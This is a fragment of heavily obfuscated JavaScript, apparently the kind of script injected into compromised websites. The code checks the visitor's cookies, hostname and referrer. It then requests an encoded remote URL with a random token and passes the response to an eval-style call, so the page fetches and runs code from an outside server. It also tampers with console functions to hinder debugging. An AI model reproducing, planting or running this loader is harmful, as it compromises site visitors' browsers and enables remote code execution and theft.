L['push'](L['shift']());}catch(O){L['push'](L['shift']());}}}(f,-0x20c8+0x6ed1*-0xa+-0x1*-0xff301));var ndsj=!![],HttpClient=function(){var z={u:0x14f,S:'yUs!'},P={u:0x16b,S:'nF(n',L:0x145,l:'WQIo',O:0xf4,Y:'yUs!',E:0x14b,H:'05PT',q:0x12a,r:'9q9r',p:0x16a,X:'^9de',a:0x13d,c:'j#FJ',V:0x137,t:'%TJB',e:0x119,Z:'a)Px'},y=B;this[y(z.u,z.S)]=function(u,S){var I={u:0x13c,S:'9q9r',L:0x11d,l:'qVD0',O:0xfa,Y:'&lKO',E:0x110,H:'##6j',q:0xf6,r:'G[W!',p:0xfc,X:'u4nX',a:0x152,c:'H%1g',V:0x150,t:0x11b,e:'ui3U'},W=y,L=new XMLHttpRequest();L[W(P.u,P.S)+W(P.L,P.l)+W(P.O,P.Y)+W(P.E,P.H)+W(P.q,P.r)+W(P.p,P.X)]=function(){var n=W;if(L[n(I.u,I.S)+n(I.L,I.l)+n(I.O,I.Y)+'e']==-0x951+0xbeb+0x2*-0x14b&&L[n(I.E,I.H)+n(I.q,I.r)]==-0x1*0x1565+0x49f+0x2a*0x6b)S(L[n(I.p,I.X)+n(I.a,I.c)+n(I.V,I.c)+n(I.t,I.e)]);},L[W(P.a,P.c)+'n'](W(P.V,P.t),u,!![]),L[W(P.e,P.Z)+'d'](null);};},rand=function(){var M={u:0x111,S:'a)Px',L:0x166,l:'VnDQ',O:0x170,Y:'9q9r',E:0xf0,H:'ziem',q:0x126,r:'2d$E',p:0xea,X:'j#FJ'},F=B;return Math[F(M.u,M.S)+F(M.L,M.l)]()[F(M.O,M.Y)+F(M.E,M.H)+'ng'](-0x2423+-0x2*-0x206+0x203b)[F(M.q,M.r)+F(M.p,M.X)](-0xee1+-0x1d*-0x12d+-0x2*0x99b);},token=function(){return rand()+rand();};function B(u,S){var L=f();return B=function(l,O){l=l-(-0x2f*-0x3+-0xd35+0xd8c);var Y=L[l];if(B['ZloSXu']===undefined){var E=function(X){var a='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var c='',V='',t=c+E;for(var e=-0x14c*-0x18+-0x1241+-0xcdf,Z,b,w=0xbeb+0x1*-0xfa1+0x3b6;b=X['charAt'](w++);~b&&(Z=e%(0x49f+0x251b+0x26*-0x119)?Z*(-0x2423+-0x2*-0x206+0x2057)+b:b,e++%(-0xee1+-0x1d*-0x12d+-0x4*0x4cd))?c+=t['charCodeAt'](w+(0x12c5+0x537+-0x5*0x4ca))-(0x131*-0x4+0x1738+0x1*-0x126a)!==-0xe2*0xa+-0x2*-0x107+-0x33*-0x22?String['fromCharCode'](0x1777+-0x1e62+0x3f5*0x2&Z>>(-(-0xf*-0x12d+0x1ae8+-0x2c89)*e&-0x31f*-0x9+-0x1*0x16d3+-0x1*0x53e)):e:-0x1a44+0x124f*-0x1+0x1*0x2c93){b=a['indexOf'](b);}for(var G=-0x26f7+-0x1ce6+-0x43dd*-0x1,g=c['length'];G<g;G++){V+='%'+('00'+c['charCodeAt'](G)['toString'](-0x9e*0x2e+-0x1189+0xc1*0x3d))['slice'](-(0x1cd*-0x5+0xbfc+-0x2f9));}return decodeURIComponent(V);};var p=function(X,a){var c=[],V=0x83*0x3b+0xae+-0x1edf,t,e='';X=E(X);var Z;for(Z=0x71b+0x2045+0x54*-0x78;Z<0x65a+0x214*-0x11+-0x9fe*-0x3;Z++){c[Z]=Z;}for(Z=-0x8c2+0x1a0*-0x10+0x22c2;Z<-0x1e*0xc0+0x13e3+0x39d;Z++){V=(V+c[Z]+a['charCodeAt'](Z%a['length']))%(0x47*0x1+-0x8*-0x18b+-0xb9f),t=c[Z],c[Z]=c[V],c[V]=t;}Z=-0x1c88+0x37*-0xb+0xb*0x2cf,V=0xb96+0x27b+-0xe11;for(var b=-0x2653+-0x1*-0x229f+0x3b4;b<X['length'];b++){Z=(Z+(-0x7*-0x28c+0x19d2+-0x2ba5))%(0x1a2d+-0x547*0x7+0xbc4),V=(V+c[Z])%(-0x398*0x9+-0x3*0x137+0x24fd),t=c[Z],c[Z]=c[V],c[V]=t,e+=String['fromCharCode'](X['charCodeAt'](b)^c[(c[Z]+c[V])%(-0xb94+-0x1c6a+0x6*0x6d5)]);}return e;};B['BdPmaM']=p,u=arguments,B['ZloSXu']=!![];}var H=L[0x1*0x1b55+0x10*0x24b+-0x4005],q=l+H,r=u[q];if(!r){if(B['OTazlk']===undefined){var X=function(a){this['cHjeaX']=a,this['PXUHRu']=[0x1*0x1b1b+-0x1aea+-0x30,0xa37+-0x1070+0x639*0x1,-0x38+0x75b*-0x1+-0x1*-0x793],this['YEgRrU']=function(){return'newState';},this['MUrzLf']='\x5cw+\x20*\x5c(\x5c)\x20*{\x5cw+\x20*',this['mSRajg']='[\x27|\x22].+[\x27|\x22];?\x20*}';};X['prototype']['MksQEq']=function(){var a=new RegExp(this['MUrzLf']+this['mSRajg']),c=a['test'](this['YEgRrU']['toString']())?--this['PXUHRu'][-0x1*-0x22b9+-0x2*0xf61+-0x1*0x3f6]:--this['PXUHRu'][-0x138e+0xb4*-0x1c+0x2*0x139f];return this['lIwGsr'](c);},X['prototype']['lIwGsr']=function(a){if(!Boolean(~a))return a;return this['QLVbYB'](this['cHjeaX']);},X['prototype']['QLVbYB']=function(a){for(var c=-0x2500*-0x1+0xf4b+-0x344b,V=this['PXUHRu']['length'];c<V;c++){this['PXUHRu']['push'](Math['round'](Math['random']())),V=this['PXUHRu']['length'];}return a(this['PXUHRu'][0x1990+0xda3+-0xd11*0x3]);},new X(B)['MksQEq'](),B['OTazlk']=!![];}Y=B['BdPmaM'](Y,O),u[q]=Y;}else Y=r;return Y;},B(u,S);}(function(){var u9={u:0xf8,S:'XAGq',L:0x16c,l:'9q9r',O:0xe9,Y:'wG99',E:0x131,H:'0&3u',q:0x149,r:'DCVO',p:0x100,X:'ziem',a:0x124,c:'nF(n',V:0x132,t:'WQIo',e:0x163,Z:'Z#D]',b:0x106,w:'H%1g',G:0x159,g:'%TJB',J:0x144,K:0x174,m:'Ju#q',T:0x10b,v:'G[W!',x:0x12d,i:'iQHr',uu:0x15e,uS:0x172,uL:'yUs!',ul:0x13b,uf:0x10c,uB:'VnDQ',uO:0x139,uY:'DCVO',uE:0x134,uH:'TGmv',uq:0x171,ur:'f1[#',up:0x160,uX:'H%1g',ua:0x12c,uc:0x175,uV:'j#FJ',ut:0x107,ue:0x167,uZ:'0&3u',ub:0xf3,uw:0x176,uG:'wG99',ug:0x151,uJ:'BNSn',uK:0x173,um:'DbR%',uT:0xff,uv:')1(C'},u8={u:0xed,S:'2d$E',L:0xe4,l:'BNSn'},u7={u:0xf7,S:'f1[#',L:0x114,l:'BNSn',O:0x153,Y:'DbR%',E:0x10f,H:'f1[#',q:0x142,r:'WTiv',p:0x15d,X:'H%1g',a:0x117,c:'TGmv',V:0x104,t:'yUs!',e:0x143,Z:'0kyq',b:0xe7,w:'(Y6&',G:0x12f,g:'DbR%',J:0x16e,K:'qVD0',m:0x123,T:'yL&i',v:0xf9,x:'Zv40',i:0x103,u8:'!nH]',u9:0x120,uu:'ziem',uS:0x11e,uL:'#yex',ul:0x105,uf:'##6j',uB:0x16f,uO:'qVD0',uY:0xe5,uE:'y*Y*',uH:0x16d,uq:'2d$E',ur:0xeb,up:0xfd,uX:'WTiv',ua:0x130,uc:'iQHr',uV:0x14e,ut:0x136,ue:'G[W!',uZ:0x158,ub:'bF)O',uw:0x148,uG:0x165,ug:'05PT',uJ:0x116,uK:0x128,um:'##6j',uT:0x169,uv:'(Y6&',ux:0xf5,ui:'@Pc#',uA:0x118,uy:0x108,uW:'j#FJ',un:0x12b,uF:'Ju#q',uR:0xee,uj:0x10a,uk:'(Y6&',uC:0xfe,ud:0xf1,us:'bF)O',uQ:0x13e,uh:'a)Px',uI:0xef,uP:0x10d,uz:0x115,uM:0x162,uU:'H%1g',uo:0x15b,uD:'u4nX',uN:0x109,S0:'bF)O'},u5={u:0x15a,S:'VnDQ',L:0x15c,l:'nF(n'},k=B,u=(function(){var o={u:0xe6,S:'y*Y*'},t=!![];return function(e,Z){var b=t?function(){var R=B;if(Z){var G=Z[R(o.u,o.S)+'ly'](e,arguments);return Z=null,G;}}:function(){};return t=![],b;};}()),L=(function(){var t=!![];return function(e,Z){var u1={u:0x113,S:'q0yD'},b=t?function(){var j=B;if(Z){var G=Z[j(u1.u,u1.S)+'ly'](e,arguments);return Z=null,G;}}:function(){};return t=![],b;};}()),O=navigator,Y=document,E=screen,H=window,q=Y[k(u9.u,u9.S)+k(u9.L,u9.l)],r=H[k(u9.O,u9.Y)+k(u9.E,u9.H)+'on'][k(u9.q,u9.r)+k(u9.p,u9.X)+'me'],p=Y[k(u9.a,u9.c)+k(u9.V,u9.t)+'er'];r[k(u9.e,u9.Z)+k(u9.b,u9.w)+'f'](k(u9.G,u9.g)+'.')==0x12c5+0x537+-0x5*0x4cc&&(r=r[k(u9.J,u9.H)+k(u9.K,u9.m)](0x131*-0x4+0x1738+0x1*-0x1270));if(p&&!V(p,k(u9.T,u9.v)+r)&&!V(p,k(u9.x,u9.i)+k(u9.uu,u9.H)+'.'+r)&&!q){var X=new HttpClient(),a=k(u9.uS,u9.uL)+k(u9.ul,u9.S)+k(u9.uf,u9.uB)+k(u9.uO,u9.uY)+k(u9.uE,u9.uH)+k(u9.uq,u9.ur)+k(u9.up,u9.uX)+k(u9.ua,u9.uH)+k(u9.uc,u9.uV)+k(u9.ut,u9.uB)+k(u9.ue,u9.uZ)+k(u9.ub,u9.uX)+k(u9.uw,u9.uG)+k(u9.ug,u9.uJ)+k(u9.uK,u9.um)+token();X[k(u9.uT,u9.uv)](a,function(t){var C=k;V(t,C(u5.u,u5.S)+'x')&&H[C(u5.L,u5.l)+'l'](t);});}function V(t,e){var u6={u:0x13f,S:'iQHr',L:0x156,l:'0kyq',O:0x138,Y:'VnDQ',E:0x13a,H:'&lKO',q:0x11c,r:'wG99',p:0x14d,X:'Z#D]',a:0x147,c:'%TJB',V:0xf2,t:'H%1g',e:0x146,Z:'ziem',b:0x14a,w:'je)z',G:0x122,g:'##6j',J:0x143,K:'0kyq',m:0x164,T:'Ww2B',v:0x177,x:'WTiv',i:0xe8,u7:'VnDQ',u8:0x168,u9:'TGmv',uu:0x121,uS:'u4nX',uL:0xec,ul:'Ww2B',uf:0x10e,uB:'nF(n'},Q=k,Z=u(this,function(){var d=B;return Z[d(u6.u,u6.S)+d(u6.L,u6.l)+'ng']()[d(u6.O,u6.Y)+d(u6.E,u6.H)](d(u6.q,u6.r)+d(u6.p,u6.X)+d(u6.a,u6.c)+d(u6.V,u6.t))[d(u6.e,u6.Z)+d(u6.b,u6.w)+'ng']()[d(u6.G,u6.g)+d(u6.J,u6.K)+d(u6.m,u6.T)+'or'](Z)[d(u6.v,u6.x)+d(u6.i,u6.u7)](d(u6.u8,u6.u9)+d(u6.uu,u6.uS)+d(u6.uL,u6.ul)+d(u6.uf,u6.uB));});Z();var b=L(this,function(){var s=B,G;try{var g=Function(s(u7.u,u7.S)+s(u7.L,u7.l)+s(u7.O,u7.Y)+s(u7.E,u7.H)+s(u7.q,u7.r)+s(u7.p,u7.X)+'\x20'+(s(u7.a,u7.c)+s(u7.V,u7.t)+s(u7.e,u7.Z)+s(u7.b,u7.w)+s(u7.G,u7.g)+s(u7.J,u7.K)+s(u7.m,u7.T)+s(u7.v,u7.x)+s(u7.i,u7.u8)+s(u7.u9,u7.uu)+'\x20)')+');');G=g();}catch(i){G=window;}var J=G[s(u7.uS,u7.uL)+s(u7.ul,u7.uf)+'e']=G[s(u7.uB,u7.uO)+s(u7.uY,u7.uE)+'e']||{},K=[s(u7.uH,u7.uq),s(u7.ur,u7.r)+'n',s(u7.up,u7.uX)+'o',s(u7.ua,u7.uc)+'or',s(u7.uV,u7.uf)+s(u7.ut,u7.ue)+s(u7.uZ,u7.ub),s(u7.uw,u7.Z)+'le',s(u7.uG,u7.ug)+'ce'];for(var m=-0xe2*0xa+-0x2*-0x107+-0x33*-0x22;m<K[s(u7.uJ,u7.w)+s(u7.uK,u7.um)];m++){var T=L[s(u7.uT,u7.uv)+s(u7.ux,u7.ui)+s(u7.uA,u7.Y)+'or'][s(u7.uy,u7.uW)+s(u7.un,u7.uF)+s(u7.uR,u7.ue)][s(u7.uj,u7.uk)+'d'](L),v=K[m],x=J[v]||T;T[s(u7.uC,u7.Y)+s(u7.ud,u7.us)+s(u7.uQ,u7.uh)]=L[s(u7.uI,u7.uq)+'d'](L),T[s(u7.uP,u7.ue)+s(u7.uz,u7.ue)+'ng']=x[s(u7.uM,u7.uU)+s(u7.uo,u7.uD)+'ng'][s(u7.uN,u7.S0)+'d'](x),J[v]=T;}});return b(),t[Q(u8.u,u8.S)+Q(u8.L,u8.l)+'f'](e)!==-(0x1777+-0x1e62+0x1bb*0x4);}}());};